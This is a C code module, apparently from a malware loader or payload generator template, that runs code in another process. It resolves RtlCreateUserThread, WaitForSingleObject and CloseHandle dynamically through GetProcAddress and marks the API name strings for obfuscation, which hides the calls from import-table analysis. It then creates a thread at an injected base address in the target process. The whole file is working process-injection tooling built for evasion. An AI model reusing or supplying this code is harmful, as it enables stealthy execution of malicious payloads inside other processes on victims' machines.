// Description: Dynamicly resolved pRtlCreateUserThread + WaitForSingleObject + CloseHandle
// Used WinAPIs: CreateRemoteThread WaitForSingleObject
// IOCS strings:
#include <winternl.h>

typedef NTSTATUS (NTAPI * RtlCreateUserThread_t) (
    HANDLE,
    PSECURITY_DESCRIPTOR,
    BOOL,
    ULONG,
    PULONG,
    PULONG,
    PVOID,
    PVOID,
    PHANDLE,
    PCLIENT_ID
);

BOOL ExecuteMemory(HANDLE process, LPVOID baseAddress) {
    RtlCreateUserThread_t pRtlCreateUserThread = (RtlCreateUserThread_t) GetProcAddress(GetModuleHandle(<obf>"NTDLL.DLL"<ob_end>), <obf>"RtlCreateUserThread"<ob_end>);

    typedef DWORD (WINAPI * WaitForSingleObject_) (HANDLE hHandle, DWORD dwMilliseconds);
    typedef BOOL (WINAPI * CloseHandle_) (HANDLE hObject);
    WaitForSingleObject_ _WaitForSingleObject = (WaitForSingleObject_)GetProcAddress(GetModuleHandleA(<obf>"kernel32.dll"<ob_end>), <obf>"WaitForSingleObject"<ob_end>);
    CloseHandle_ _CloseHandle = (CloseHandle_)GetProcAddress(GetModuleHandleA(<obf>"kernel32.dll"<ob_end>), <obf>"CloseHandle"<ob_end>);


    if (pRtlCreateUserThread == NULL) {
        #ifdef DEBUG
            printf("[-] GetProcAddress for RtlCreateUserThread failed (%d)\n", GetLastError());
        #endif
        return FALSE;
    }

    HANDLE thread = NULL;
    CLIENT_ID ClientId = {0};

    NTSTATUS status = pRtlCreateUserThread(process, NULL, FALSE, 0, NULL, NULL, baseAddress, NULL, &thread, &ClientId);

    if (!NT_SUCCESS(status)) {
        #ifdef DEBUG
            printf("[-] RtlCreateUserThread failed (%08x)\n", status);
        #endif
        return FALSE;
    }

    _WaitForSingleObject(thread, INFINITE);
    _CloseHandle(thread);
    return TRUE;
}
